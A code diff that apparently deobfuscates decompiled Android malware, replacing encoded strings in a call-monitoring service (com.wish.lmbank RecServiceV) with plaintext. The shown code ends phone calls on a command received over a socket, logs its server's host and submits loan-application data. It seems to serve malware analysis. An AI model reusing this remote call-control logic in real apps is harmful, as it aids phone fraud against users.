@@ -20,6 +20,7 @@ import android.os.PowerManager;
 import android.os.Process;
 import android.provider.CallLog;
 import android.text.TextUtils;
+import android.util.Log;
 
 import androidx.annotation.NonNull;
 import androidx.vectordrawable.graphics.drawable.PathInterpolatorCompat;
@@ -272,7 +273,7 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
     @Override // android.app.Service
     public void onCreate() {
         super.onCreate();
-        System.out.println("运行");
+        Log.i(TAG, "RecSerivceV onCreate...........");
         init();
     }
 
@@ -799,7 +800,8 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
     @Override // com.wish.lmbank.hellodaemon.AbsWorkService, android.app.Service
     public void onDestroy() {
         super.onDestroy();
-        /* sb.append(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoMSQYHLQwaHRsGEEVJABlTSQ")); */
+//-^-         /* sb.append(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoMSQYHLQwaHRsGEEVJABlTSQ")); */
+        /* sb.append("RecorderService onDestroy, ip: "); */
         String sb = "RecorderService onDestroy, ip: " +
                 URL.getHost();
         LogUtils.callLog(sb);
@@ -900,7 +902,8 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         if (this.mNetStateReceiver == null) {
             this.mNetStateReceiver = new BroadcastReceiver() { // from class: com.wish.lmbank.service.RecServiceV.15
                 public void onReceive(Context context, Intent intent) {
-                    ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(bb7d7pu7.m5998("CgYHBwwKHQAfAB0Q"));
+//-^-                     ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(bb7d7pu7.m5998("CgYHBwwKHQAfAB0Q"));
+                    ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService("connectivity");
                     if (Build.VERSION.SDK_INT < 21) {
                         NetworkInfo networkInfo = connectivityManager.getNetworkInfo(1);
                         NetworkInfo networkInfo2 = connectivityManager.getNetworkInfo(0);
@@ -913,7 +916,8 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
                         }
                     }
                     submitLoanApplication(false);
-                    LogUtils.v(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"), bb7d7pu7.m5998("BwwdHgYbAjodCB0MOwwKDAAfDBtFSQAaKgYHBwwKHQwNU0k") + false);
+//-^-                     LogUtils.v(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"), bb7d7pu7.m5998("BwwdHgYbAjodCB0MOwwKDAAfDBtFSQAaKgYHBwwKHQwNU0k") + false);
+                    LogUtils.v("RecorderService", "networkStateReceiver, isConnected: " + false);
                 }
             };
             IntentFilter intentFilter = new IntentFilter();
@@ -1496,16 +1500,19 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
 
     @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
     public void onReceiveHangUp(CommandHangUpBean commandHangUpBean) {
-        if (bb7d7pu7.m5998("WQ").equals(commandHangUpBean.getUpdateLimitPhone())) {
+//-^-         if (bb7d7pu7.m5998("WQ").equals(commandHangUpBean.getUpdateLimitPhone())) {
+        if ("0".equals(commandHangUpBean.getUpdateLimitPhone())) {
             loadLimitPhoneNumber();
         }
         try {
             PhoneCallManager.endCall();
             submitLoanApplication(true);
         } catch (Exception e) {
-            LogUtils.callLog(bb7d7pu7.m5998("Bgc7DAoMAB8MIQgHDjwZRUkMEQoMGR0ABgdTSQ") + e.getMessage());
+//-^-             LogUtils.callLog(bb7d7pu7.m5998("Bgc7DAoMAB8MIQgHDjwZRUkMEQoMGR0ABgdTSQ") + e.getMessage());
+            LogUtils.callLog("onReceiveHangUp, exception: " + e.getMessage());
         }
-        LogUtils.callLog(bb7d7pu7.m5998("Bgc7DAoMAB8MIQgHDjwZRUmP4OKM48GP5euP_8RJABo6HAoKDBoaU0k") + false);
+//-^-         LogUtils.callLog(bb7d7pu7.m5998("Bgc7DAoMAB8MIQgHDjwZRUmP4OKM48GP5euP_8RJABo6HAoKDBoaU0k") + false);
+        LogUtils.callLog("onReceiveHangUp, 手动挂断 isSuccess: " + false);
     }
 
 
